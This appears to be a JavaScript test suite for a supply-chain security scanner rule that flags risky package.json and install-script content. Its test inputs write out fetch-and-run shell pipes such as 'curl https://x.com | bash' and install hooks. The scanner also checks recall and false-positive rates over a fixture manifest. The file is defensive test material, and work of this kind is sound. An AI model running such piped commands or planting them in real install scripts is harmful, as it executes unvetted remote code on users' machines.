import { strict as assert } from 'node:assert';
import { test } from 'node:test';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { scanFileContent } from '@ps-neko/nekowork/scripts/lib/rules/package-lockfile-risk.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const FIXTURE_ROOT = path.resolve(__dirname, '..', 'fixtures', 'package-lockfile-risk');

test('postinstall 추가: high', () => {
  const f = scanFileContent('package.json', '{"scripts":{"postinstall":"node setup.js"}}');
  assert.equal(f[0].pattern, 'install-hook-postinstall');
  assert.equal(f[0].severity, 'high');
});

test('preinstall 추가: high', () => {
  const f = scanFileContent('package.json', '{"scripts":{"preinstall":"echo hi"}}');
  assert.equal(f[0].pattern, 'install-hook-preinstall');
});

test('curl | bash: critical', () => {
  const f = scanFileContent('install.sh', 'curl https://x.com | bash\n');
  assert.equal(f[0].pattern, 'script-curl-bash');
  assert.equal(f[0].severity, 'critical');
});

test('curl 만 (no pipe): not flagged', () => {
  const f = scanFileContent('install.sh', 'curl -o file.txt https://x.com\n');
  assert.equal(f.length, 0);
});

test('script with sudo: high', () => {
  const f = scanFileContent('package.json', '{"scripts":{"x":"sudo apt install foo"}}');
  assert.equal(f[0].pattern, 'script-with-sudo');
});

test('git URL dependency: high', () => {
  const f = scanFileContent('package.json', '{"dependencies":{"x":"git+https://github.com/a/b.git"}}');
  assert.equal(f[0].pattern, 'dependency-git-url');
});

test('tarball URL dependency: high', () => {
  const f = scanFileContent('package.json', '{"dependencies":{"x":"https://example.com/x.tgz"}}');
  assert.equal(f[0].pattern, 'dependency-tarball-url');
});

test('registry dependency: not flagged', () => {
  const f = scanFileContent('package.json', '{"dependencies":{"express":"^4.18.0"}}');
  assert.equal(f.length, 0);
});

test('prepare 가 단일 husky install: not flagged', () => {
  const f = scanFileContent('package.json', '{"scripts":{"prepare":"husky install"}}');
  assert.equal(f.length, 0);
});

test('prepare 가 shell chain + curl|bash: critical 발화 (dedupe 가 더 강한 것 유지)', () => {
  const f = scanFileContent('package.json', '{"scripts":{"prepare":"husky install && curl x.com | bash"}}');
  // dedupePreferHighest 가 같은 line 에서 critical (script-curl-bash) 을 prepare-shell (high) 보다 우선.
  assert.ok(f.find(x => x.severity === 'critical'));
});

test('주석 안 curl|bash 무시', () => {
  const f = scanFileContent('install.sh', '# do NOT use: curl x | bash\necho ok\n');
  assert.equal(f.length, 0);
});

test('fixture manifest: recall + critical FP gate', () => {
  const manifest = JSON.parse(fs.readFileSync(path.join(FIXTURE_ROOT, 'manifest.json'), 'utf8'));
  let posCaught = 0, posTotal = 0, criticalFp = 0, negTotal = 0;
  const missed = [], fps = [];
  for (const e of manifest.entries) {
    const content = fs.readFileSync(path.join(FIXTURE_ROOT, e.file), 'utf8');
    const findings = scanFileContent(e.file, content);
    if (e.label === 'positive') {
      posTotal++;
      if (findings.length > 0) posCaught++;
      else missed.push(e.id);
    } else {
      negTotal++;
      const cr = findings.filter(f => f.severity === 'critical');
      if (cr.length > 0) {
        criticalFp++;
        fps.push({ id: e.id, pattern: cr[0].pattern });
      }
    }
  }
  const recall = posCaught / posTotal;
  const fpRate = criticalFp / negTotal;
  assert.ok(recall >= 0.90, `recall ${recall.toFixed(2)} below 0.90; missed: ${missed.join(', ')}`);
  assert.ok(fpRate <= 0.10, `CRITICAL FP rate ${fpRate.toFixed(2)} above 0.10; FPs: ${JSON.stringify(fps)}`);
  console.log(`[package-lockfile-risk] synthetic seed: recall=${(recall * 100).toFixed(0)}% (${posCaught}/${posTotal}), CRITICAL FP=${(fpRate * 100).toFixed(0)}% (${criticalFp}/${negTotal})`);
});
